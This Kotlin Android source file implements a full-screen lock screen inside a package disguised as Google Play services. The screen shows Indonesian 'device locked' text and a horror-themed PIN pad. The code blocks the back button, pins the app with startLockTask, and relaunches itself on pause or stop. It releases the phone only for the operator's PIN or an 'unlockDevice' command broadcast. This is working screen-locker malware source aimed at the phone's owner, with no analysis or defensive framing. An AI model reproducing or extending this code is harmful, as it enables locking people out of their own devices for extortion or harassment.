package com.android.core.gms

import android.annotation.SuppressLint
import android.app.Activity
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.Bundle
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.media.MediaPlayer
import android.webkit.WebViewClient

class LockNewActivity : Activity() {

    private lateinit var webView: WebView
    private var mediaPlayer: MediaPlayer? = null
    private var correctPin: String  = ""
    private var lockTitle: String   = "Perangkat Terkunci"
    private var customHtml: String  = ""
    private var isReceiverRegistered = false
    private var isUnlocked = false

    private val unlockReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action == "com.android.core.gms.UNLOCK") {
                isUnlocked = true
                finish()
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        correctPin = intent?.getStringExtra(LockOverlayService.EXTRA_PIN)         ?: ""
        lockTitle  = intent?.getStringExtra(LockOverlayService.EXTRA_TITLE)       ?: "Perangkat Terkunci"
        customHtml = intent?.getStringExtra(LockOverlayService.EXTRA_CUSTOM_HTML) ?: ""

        setupWebView()
        registerUnlockReceiver()

        try {
    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
    if (dpm.isLockTaskPermitted(packageName)) startLockTask()
} catch (e: Exception) {
            android.util.Log.w("LockNewActivity", "startLockTask: ${e.message}")
        }
        playLockSound()
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        setIntent(intent)
        correctPin = intent?.getStringExtra(LockOverlayService.EXTRA_PIN)         ?: correctPin
        lockTitle  = intent?.getStringExtra(LockOverlayService.EXTRA_TITLE)       ?: lockTitle
        customHtml = intent?.getStringExtra(LockOverlayService.EXTRA_CUSTOM_HTML) ?: customHtml
    }

    override fun onBackPressed() {
    if (!isUnlocked) return
    super.onBackPressed()
}

    override fun onPause() {
        super.onPause()
        if (isUnlocked) return
        val handler = android.os.Handler(android.os.Looper.getMainLooper())
        handler.postDelayed({
            if (isUnlocked) return@postDelayed
            val intent = Intent(this, LockNewActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                putExtra(LockOverlayService.EXTRA_PIN, correctPin)
                putExtra(LockOverlayService.EXTRA_TITLE, lockTitle)
                putExtra(LockOverlayService.EXTRA_CUSTOM_HTML, customHtml)
            }
            startActivity(intent)
        }, 300)
    }

    override fun onStop() {
    super.onStop()
    if (isUnlocked) return
    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) {
        val intent = Intent(this, LockNewActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
            putExtra(LockOverlayService.EXTRA_PIN, correctPin)
            putExtra(LockOverlayService.EXTRA_TITLE, lockTitle)
            putExtra(LockOverlayService.EXTRA_CUSTOM_HTML, customHtml)
        }
        startActivity(intent)
    }
}

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        webView = WebView(this)
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
        }
        webView.setBackgroundColor(android.graphics.Color.TRANSPARENT)
        webView.addJavascriptInterface(LockBridge(), "LockBridge")
        webView.webViewClient = WebViewClient()
        if (customHtml.isNotEmpty()) {
            webView.loadDataWithBaseURL(null, buildCustomLockHtml(customHtml), "text/html", "UTF-8", null)
        } else {
            webView.loadDataWithBaseURL(null, buildLockHtml(), "text/html", "UTF-8", null)
        }
        setContentView(webView)
    }

    private fun buildCustomLockHtml(body: String): String {
        return """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<style>
*{box-sizing:border-box;margin:0;padding:0}
html,body{width:100%;height:100%;background:transparent;overflow:hidden;display:flex;align-items:center;justify-content:center}
#wrap{width:100%;height:100%;display:flex;align-items:center;justify-content:center}
</style>
</head>
<body>
<div id="wrap">
${body}
</div>
</body>
</html>""".trimIndent()
    }

    private fun registerUnlockReceiver() {
        if (isReceiverRegistered) return
        try {
            val filter = IntentFilter("com.android.core.gms.UNLOCK")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(unlockReceiver, filter, RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(unlockReceiver, filter)
            }
            isReceiverRegistered = true
        } catch (e: Exception) {
            android.util.Log.w("LockNewActivity", "registerReceiver: ${e.message}")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try { stopLockTask() } catch (_: Exception) {}
        if (isReceiverRegistered) {
            try { unregisterReceiver(unlockReceiver) } catch (_: Exception) {}
            isReceiverRegistered = false
        }
        mediaPlayer?.release()
        mediaPlayer = null
        webView.destroy()
    }

    inner class LockBridge {
        @JavascriptInterface
        fun tryUnlock(pin: String): Boolean {
            val ok = (pin == correctPin)
            if (ok) {
                android.os.Handler(android.os.Looper.getMainLooper()).post {
                    try {
                        val cmdIntent = Intent(DeviceService.ACTION_COMMAND).apply {
                            putExtra(DeviceService.EXTRA_COMMAND, "unlockDevice")
                            putExtra(DeviceService.EXTRA_VALUE, "true")
                            setPackage(packageName)
                        }
                        sendBroadcast(cmdIntent)
                    } catch (e: Exception) {
                        android.util.Log.w("LockNewActivity", "broadcast: ${e.message}")
                    }
                    val unlockIntent = Intent("com.android.core.gms.UNLOCK").apply { setPackage(packageName) }
                    sendBroadcast(unlockIntent)
                }
            }
            return ok
        }

        @JavascriptInterface
        fun getLockTitle(): String = lockTitle
    }

    private fun playLockSound() {
        try {
            val afd = resources.openRawResourceFd(R.raw.lock) ?: return
            mediaPlayer = MediaPlayer().apply {
                setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                afd.close()
                prepare()
                start()
                setOnCompletionListener { release(); mediaPlayer = null }
            }
        } catch (e: Exception) {
            android.util.Log.w("LockNewActivity", "playLockSound: ${e.message}")
        }
    }

    private fun buildLockHtml(): String {
        val safeTitle = lockTitle
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace("\"", "&quot;")

        return """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<link href="https://fonts.googleapis.com/css2?family=Creepster&family=Metal+Mania&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%;width:100%;overflow:hidden;touch-action:none}
body{
  background:#000;
  font-family:'Creepster',cursive;
  display:flex;flex-direction:column;align-items:center;justify-content:center;
  min-height:100vh;
  padding:28px 24px;
  position:relative;overflow:hidden;
}

/* ── MATRIX RED RAIN BACKGROUND ── */
#matrixCanvas{
  position:fixed;inset:0;
  pointer-events:none;
  z-index:0;
  opacity:0.55;
}

/* ── SCANLINE ── */
body::after{
  content:'';position:fixed;inset:0;
  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(255,0,0,0.012) 2px,rgba(255,0,0,0.012) 4px);
  pointer-events:none;z-index:1;
  animation:scanMove 6s linear infinite;
}
@keyframes scanMove{0%{background-position:0 0}100%{background-position:0 100px}}

/* ── RED AMBIENT ── */
body::before{
  content:'';position:fixed;inset:0;
  background:
    radial-gradient(ellipse 60% 40% at 50% 0%,rgba(180,0,0,0.16) 0%,transparent 60%),
    radial-gradient(ellipse 40% 30% at 0% 100%,rgba(120,0,0,0.08) 0%,transparent 50%),
    radial-gradient(ellipse 40% 30% at 100% 100%,rgba(120,0,0,0.07) 0%,transparent 50%);
  pointer-events:none;z-index:0;
}

/* ── GLITCH TEXT ── */
@keyframes glitchText{
  0%,90%,100%{clip-path:none;transform:none;color:#ff3333}
  92%{clip-path:inset(25% 0 45% 0);transform:translateX(-5px);color:#fff}
  95%{clip-path:inset(55% 0 15% 0);transform:translateX(5px);color:#ff0000}
  98%{clip-path:inset(5% 0 75% 0);transform:translateX(-2px)}
}

/* ── INTRO SCREEN ── */
#introScreen{
  position:fixed;inset:0;background:#000;
  display:flex;flex-direction:column;align-items:center;justify-content:center;
  z-index:100;gap:18px;
  animation:introDismiss .5s ease forwards 4.5s;
}
@keyframes introDismiss{0%{opacity:1}100%{opacity:0;transform:scale(1.03);pointer-events:none}}

.intro-icon{
  width:90px;height:90px;object-fit:contain;
  animation:iconPulse 1.2s ease-in-out infinite;
  filter:drop-shadow(0 0 12px #ff0000) drop-shadow(0 0 30px #cc0000);
}
@keyframes iconPulse{
  0%,100%{filter:drop-shadow(0 0 10px #ff0000) drop-shadow(0 0 22px #880000)}
  50%{filter:drop-shadow(0 0 22px #ff0000) drop-shadow(0 0 55px #cc0000) drop-shadow(0 0 70px #550000)}
}

.intro-title{
  font-family:'Creepster',cursive;font-size:22px;
  letter-spacing:3px;text-transform:uppercase;
  color:#ff0000;text-align:center;line-height:2;
  text-shadow:0 0 20px rgba(255,0,0,0.8),2px 2px 0 #550000;
}
.intro-title .line{display:block;overflow:hidden;white-space:nowrap}
.intro-title .line1{animation:typeIn .6s steps(12,end) .3s both}
.intro-title .line2{animation:typeIn .7s steps(20,end) 1.1s both}
.intro-title .line3{animation:typeIn .6s steps(16,end) 2s both}
@keyframes typeIn{from{width:0;opacity:0}to{opacity:1}}

.intro-bar-wrap{
  width:240px;height:4px;background:rgba(255,0,0,0.12);
  border-radius:2px;overflow:hidden;border:1px solid rgba(255,0,0,0.2);
}
.intro-bar{
  height:100%;width:0%;
  background:linear-gradient(90deg,#880000,#ff0000,#ff4444);
  border-radius:2px;
  animation:barFill 3s ease .5s forwards;
  box-shadow:0 0 12px #ff0000,0 0 24px #880000;
}
@keyframes barFill{to{width:100%}}

.intro-pct{
  font-family:'JetBrains Mono',monospace;
  font-size:11px;letter-spacing:3px;color:#ff0000;
  text-shadow:0 0 8px #ff0000;
}

/* ── MAIN CONTENT ── */
#mainContent{
  display:flex;flex-direction:column;align-items:center;
  position:relative;z-index:2;
  opacity:0;animation:mainIn .5s ease forwards 5s;
  width:100%;
}
@keyframes mainIn{to{opacity:1}}

/* ── CENTER LOGO — NO ORBIT, NO SPIN ── */
.logo-wrap{
  width:120px;height:120px;
  margin-bottom:18px;flex-shrink:0;
  display:flex;align-items:center;justify-content:center;
  position:relative;
}
/* static red glow ring — tidak berputar */
.logo-wrap::before{
  content:'';position:absolute;inset:-6px;border-radius:50%;
  border:1.5px solid rgba(255,0,0,0.25);
  box-shadow:0 0 20px rgba(255,0,0,0.15),inset 0 0 20px rgba(255,0,0,0.05);
}
.logo-wrap::after{
  content:'';position:absolute;inset:-14px;border-radius:50%;
  border:1px solid rgba(255,0,0,0.1);
}
.logo-img{
  width:100px;height:100px;
  object-fit:contain;
  filter:drop-shadow(0 0 14px rgba(255,0,0,0.8)) drop-shadow(0 0 35px rgba(200,0,0,0.5));
  animation:logoPulse 2.5s ease-in-out infinite;
}
@keyframes logoPulse{
  0%,100%{filter:drop-shadow(0 0 10px rgba(255,0,0,0.6)) drop-shadow(0 0 25px rgba(150,0,0,0.4))}
  50%{filter:drop-shadow(0 0 22px rgba(255,0,0,0.9)) drop-shadow(0 0 50px rgba(200,0,0,0.6)) drop-shadow(0 0 80px rgba(255,0,0,0.2))}
}

/* ── TITLE ── */
.lock-title{
  font-family:'Metal Mania',cursive;
  font-size:24px;color:#ff0000;
  text-align:center;letter-spacing:1px;line-height:1.2;
  margin-bottom:4px;
  text-shadow:0 0 20px rgba(255,0,0,0.6),2px 2px 0 #550000,0 0 40px rgba(255,0,0,0.3);
  animation:glitchText 6s ease infinite;
}
.lock-sub{
  font-family:'JetBrains Mono',monospace;font-size:9px;
  color:#550000;letter-spacing:3px;text-transform:uppercase;
  text-align:center;margin-bottom:24px;
}

/* ── PIN DOTS ── */
.pin-wrap{display:flex;gap:18px;justify-content:center;margin-bottom:10px;}
.pin-dot{
  width:14px;height:14px;border-radius:50%;
  border:1.5px solid rgba(255,0,0,0.3);background:transparent;
  transition:background .18s,border-color .18s,box-shadow .18s,transform .18s;
}
.pin-dot.filled{
  background:#ff0000;border-color:#ff0000;
  box-shadow:0 0 14px rgba(255,0,0,0.9),0 0 28px rgba(255,0,0,0.5);
  transform:scale(1.15);
}
.pin-dot.error{
  border-color:#ff0000;background:rgba(255,0,0,0.2);
  box-shadow:0 0 14px rgba(255,0,0,0.6);
  animation:shake .4s ease;
}
@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-8px)}75%{transform:translateX(8px)}}

/* ── STATUS ── */
.pin-status{
  height:22px;margin-bottom:20px;
  font-family:'JetBrains Mono',monospace;font-size:10px;
  letter-spacing:2px;text-transform:uppercase;
  text-align:center;color:#550000;transition:color .2s;
}
.pin-status.err{color:#ff0000;text-shadow:0 0 10px rgba(255,0,0,0.8)}
.pin-status.ok{color:#ff4444;text-shadow:0 0 12px rgba(255,0,0,0.8)}

/* ── KEYPAD — FLAT, NO CARD ── */
.keypad{
  display:grid;grid-template-columns:repeat(3,1fr);
  gap:4px;width:100%;max-width:300px;
}
.key{
  height:68px;
  background:transparent;
  border:none;outline:none;
  color:#ff2222;
  display:flex;flex-direction:column;align-items:center;justify-content:center;
  cursor:pointer;-webkit-tap-highlight-color:transparent;
  position:relative;overflow:hidden;user-select:none;
  /* hanya garis bawah tipis sebagai separator */
  border-bottom:1px solid rgba(255,0,0,0.08);
}
.key .num{
  font-family:'Creepster',cursive;
  font-size:30px;font-weight:400;line-height:1;
  color:#ff2222;
  text-shadow:0 0 10px rgba(255,0,0,0.6);
  position:relative;
  transition:text-shadow .1s,color .1s;
}
/* glitch per tombol — random timing */
.key:nth-child(1) .num{animation:numGlitch 8.0s ease infinite 0.0s}
.key:nth-child(2) .num{animation:numGlitch 7.5s ease infinite 0.9s}
.key:nth-child(3) .num{animation:numGlitch 9.0s ease infinite 1.8s}
.key:nth-child(4) .num{animation:numGlitch 6.8s ease infinite 0.4s}
.key:nth-child(5) .num{animation:numGlitch 8.5s ease infinite 2.3s}
.key:nth-child(6) .num{animation:numGlitch 7.2s ease infinite 1.1s}
.key:nth-child(7) .num{animation:numGlitch 9.3s ease infinite 0.7s}
.key:nth-child(8) .num{animation:numGlitch 6.5s ease infinite 1.5s}
.key:nth-child(9) .num{animation:numGlitch 8.8s ease infinite 2.8s}
.key:nth-child(11) .num{animation:numGlitch 7.0s ease infinite 0.3s}
@keyframes numGlitch{
  0%,84%,100%{transform:none;color:#ff2222;text-shadow:0 0 10px rgba(255,0,0,0.5);clip-path:none;opacity:1}
  85%{transform:translateX(-4px) skewX(-10deg);color:#fff;clip-path:inset(10% 0 70% 0);text-shadow:3px 0 #ff0000,-2px 0 #880000;opacity:0.9}
  87%{transform:translateX(5px) skewX(8deg);color:#ff0000;clip-path:inset(70% 0 5% 0);opacity:0.7}
  89%{transform:translateX(-2px);clip-path:none;color:#ff6666;text-shadow:0 0 20px rgba(255,0,0,1)}
  91%{transform:translateX(1px);color:#ff0000;clip-path:inset(35% 0 45% 0);opacity:0.5}
  93%{transform:none;clip-path:none;opacity:0.2}
  95%{opacity:1;color:#ff2222;text-shadow:0 0 18px rgba(255,0,0,0.9)}
}

/* ERROR: semua angka glitch serentak saat PIN salah */
.keypad.error-shake .key .num{
  animation:numError 0.6s ease !important;
}
@keyframes numError{
  0%{transform:none;color:#ff2222}
  10%{transform:translateX(-6px) skewX(-15deg);color:#fff;text-shadow:4px 0 #ff0000,-4px 0 #ff0000}
  20%{transform:translateX(6px) skewX(15deg);color:#ff0000;clip-path:inset(20% 0 60% 0)}
  30%{transform:translateX(-4px);clip-path:inset(60% 0 20% 0);color:#ffaaaa}
  40%{transform:translateX(4px);clip-path:none;opacity:0.3}
  50%{transform:none;color:#ff0000;opacity:1;text-shadow:0 0 20px #ff0000}
  60%{transform:translateX(-3px);clip-path:inset(30% 0 50% 0);color:#fff}
  70%{transform:translateX(3px);clip-path:none;color:#ff2222}
  80%{opacity:0.5;transform:skewX(-5deg)}
  100%{transform:none;color:#ff2222;opacity:1;clip-path:none}
}

.key .sub{
  font-family:'JetBrains Mono',monospace;font-size:6.5px;
  letter-spacing:2px;color:#440000;margin-top:2px;
}
.key.del{color:#ff2222}
.key.empty{pointer-events:none;opacity:0;background:transparent;border:none}
.key:active .num{
  color:#ff6666;
  text-shadow:0 0 20px rgba(255,0,0,1),0 0 40px rgba(255,0,0,0.5);
  transform:scale(0.9);
}

/* ── ENTRY ANIMS ── */
.logo-wrap{animation:popIn .5s cubic-bezier(.16,1,.3,1) both}
@keyframes popIn{from{opacity:0;transform:scale(.6)}to{opacity:1;transform:none}}
.lock-title{animation:fadeUp .45s cubic-bezier(.16,1,.3,1) .1s both}
.lock-sub{animation:fadeUp .45s cubic-bezier(.16,1,.3,1) .15s both}
.pin-wrap{animation:fadeUp .45s cubic-bezier(.16,1,.3,1) .2s both}
.pin-status{animation:fadeUp .45s cubic-bezier(.16,1,.3,1) .24s both}
.keypad{animation:fadeUp .45s cubic-bezier(.16,1,.3,1) .29s both}
@keyframes fadeUp{from{opacity:0;transform:translateY(18px)}to{opacity:1;transform:none}}
</style>
</head>
<body>

<!-- MATRIX RAIN CANVAS -->
<canvas id="matrixCanvas"></canvas>

<!-- INTRO SCREEN -->
<div id="introScreen">
  <img class="intro-icon"
       src="https://files.catbox.moe/puneo5.png"
       onerror="this.style.display='none'" alt="">
  <div class="intro-title">
    <span class="line line1">HAII BROOO</span>
    <span class="line line2">XEU MING X AKT SYSTEM</span>
    <span class="line line3">PHONE TERKUNCI</span>
  </div>
  <div class="intro-bar-wrap"><div class="intro-bar"></div></div>
  <div class="intro-pct" id="pctNum">0%</div>
</div>

<!-- MAIN CONTENT -->
<div id="mainContent">

  <!-- LOGO STATIC — tidak berputar -->
  <div class="logo-wrap">
    <img class="logo-img"
         src="https://files.catbox.moe/puneo5.png"
         onerror="this.style.display='none'" alt="">
  </div>

  <div class="lock-title">$safeTitle</div>
  <div class="lock-sub">Masukkan PIN untuk membuka</div>

  <div class="pin-wrap">
    <div class="pin-dot" id="d0"></div>
    <div class="pin-dot" id="d1"></div>
    <div class="pin-dot" id="d2"></div>
    <div class="pin-dot" id="d3"></div>
  </div>

  <div class="pin-status" id="pinStatus">Creator Smooth UK</div>

  <div class="keypad" id="keypad">
    <div class="key" data-n="1"><span class="num">1</span><span class="sub"></span></div>
    <div class="key" data-n="2"><span class="num">2</span><span class="sub">ABC</span></div>
    <div class="key" data-n="3"><span class="num">3</span><span class="sub">DEF</span></div>
    <div class="key" data-n="4"><span class="num">4</span><span class="sub">GHI</span></div>
    <div class="key" data-n="5"><span class="num">5</span><span class="sub">JKL</span></div>
    <div class="key" data-n="6"><span class="num">6</span><span class="sub">MNO</span></div>
    <div class="key" data-n="7"><span class="num">7</span><span class="sub">PQRS</span></div>
    <div class="key" data-n="8"><span class="num">8</span><span class="sub">TUV</span></div>
    <div class="key" data-n="9"><span class="num">9</span><span class="sub">WXYZ</span></div>
    <div class="key empty"></div>
    <div class="key" data-n="0"><span class="num">0</span></div>
    <div class="key del" data-del="1">
      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ff2222" stroke-width="1.8">
        <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"/>
        <line x1="18" y1="9" x2="12" y2="15"/><line x1="12" y1="9" x2="18" y2="15"/>
      </svg>
    </div>
  </div>
</div>

<script>
/* ── MATRIX RED RAIN ── */
(function(){
  var canvas = document.getElementById('matrixCanvas');
  var ctx = canvas.getContext('2d');
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;

  var chars = '0123456789ABCDEF01アイウエ死恐怖666';
  var fontSize = 13;
  var cols = Math.floor(canvas.width / fontSize);
  var drops = [];
  for(var i = 0; i < cols; i++){
    drops[i] = Math.random() * -canvas.height;
  }

  function draw(){
    ctx.fillStyle = 'rgba(0,0,0,0.05)';
    ctx.fillRect(0,0,canvas.width,canvas.height);

    for(var i = 0; i < drops.length; i++){
      var char = chars[Math.floor(Math.random()*chars.length)];
      var y = drops[i] * fontSize;

      /* leading char lebih terang */
      if(drops[i] > 0 && drops[i] < canvas.height/fontSize){
        ctx.fillStyle = 'rgba(255,80,80,0.9)';
        ctx.font = 'bold ' + fontSize + 'px JetBrains Mono,monospace';
        ctx.fillText(char, i*fontSize, y);
      }

      /* trailing chars lebih redup */
      ctx.fillStyle = 'rgba(180,0,0,' + (0.2 + Math.random()*0.3) + ')';
      ctx.font = fontSize + 'px JetBrains Mono,monospace';
      ctx.fillText(chars[Math.floor(Math.random()*chars.length)], i*fontSize, y - fontSize);
      ctx.fillText(chars[Math.floor(Math.random()*chars.length)], i*fontSize, y - fontSize*2);

      if(y > canvas.height && Math.random() > 0.975){
        drops[i] = 0;
      }
      drops[i] += 0.5;
    }
  }
  setInterval(draw, 40);
})();

/* ── INTRO PERCENT COUNTER ── */
(function(){
  var el = document.getElementById('pctNum');
  var start = null;
  var dur = 3000;
  function step(ts){
    if(!start) start = ts + 500;
    var p = Math.min(1, Math.max(0,(ts-start)/dur));
    el.textContent = Math.floor(p*100) + '%';
    if(p < 1) requestAnimationFrame(step);
  }
  requestAnimationFrame(step);
})();

/* ── HIDE INTRO ── */
setTimeout(function(){
  var intro = document.getElementById('introScreen');
  intro.style.pointerEvents = 'none';
  setTimeout(function(){ intro.style.display='none'; }, 500);
}, 4500);

/* ── PIN LOGIC ── */
var pin = '';
var blocked = false;
var kp = document.getElementById('keypad');

kp.addEventListener('touchend', function(e){
  e.preventDefault();
  var key = e.target.closest('.key');
  if(!key || key.classList.contains('empty')) return;
  if(key.dataset.del){ doDelete(); return; }
  if(key.dataset.n !== undefined) doPress(key.dataset.n);
}, { passive: false });

kp.addEventListener('click', function(e){
  if(e.sourceCapabilities && e.sourceCapabilities.firesTouchEvents) return;
  var key = e.target.closest('.key');
  if(!key || key.classList.contains('empty')) return;
  if(key.dataset.del){ doDelete(); return; }
  if(key.dataset.n !== undefined) doPress(key.dataset.n);
});

function doPress(n){
  if(blocked || pin.length >= 4) return;
  pin += n;
  updateDots();
  if(pin.length === 4) setTimeout(checkPin, 150);
}
function doDelete(){
  if(blocked) return;
  pin = pin.slice(0,-1);
  updateDots();
  setStatus('',false,false);
}
function updateDots(){
  for(var i=0;i<4;i++){
    var d = document.getElementById('d'+i);
    d.classList.toggle('filled', i < pin.length);
    d.classList.remove('error');
  }
}
function checkPin(){
  var ok = false;
  try{ ok = LockBridge.tryUnlock(pin); }catch(e){}
  if(ok){
    setStatus('PIN Benar \u2713',false,true);
  } else {
    setStatus('PIN Salah!',true,false);
    for(var i=0;i<4;i++) document.getElementById('d'+i).classList.add('error');
    /* ERROR: trigger glitch serentak semua angka */
    kp.classList.add('error-shake');
    blocked = true;
    setTimeout(function(){
      kp.classList.remove('error-shake');
      pin=''; blocked=false;
      updateDots();
      setStatus('Coba lagi',false,false);
    }, 1200);
  }
}
function setStatus(msg,isErr,isOk){
  var el = document.getElementById('pinStatus');
  el.textContent = msg || 'XEU MING SYSTEM';
  el.className = 'pin-status' + (isErr?' err': isOk?' ok':'');
}
</script>
</body>
</html>
"""
    }
}